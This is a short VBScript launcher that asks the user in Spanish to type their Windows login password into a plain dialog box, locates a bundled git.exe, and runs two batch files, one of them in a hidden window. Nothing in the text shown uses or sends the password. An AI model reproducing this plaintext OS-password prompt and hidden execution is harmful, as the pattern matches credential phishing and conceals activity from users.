pass = InputBox("Indica, por favor, tu contrase"&chr(241)&"a de inicio de sesi"&chr(243)&"n de windows", "Indica tu contrase"&chr(241)&"a")
git = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName) & "\Git\bin\git.exe"
CreateObject("WScript.Shell").Run "update.cmd", 0, True
CreateObject("Wscript.Shell").Run "jass.cmd", 0, False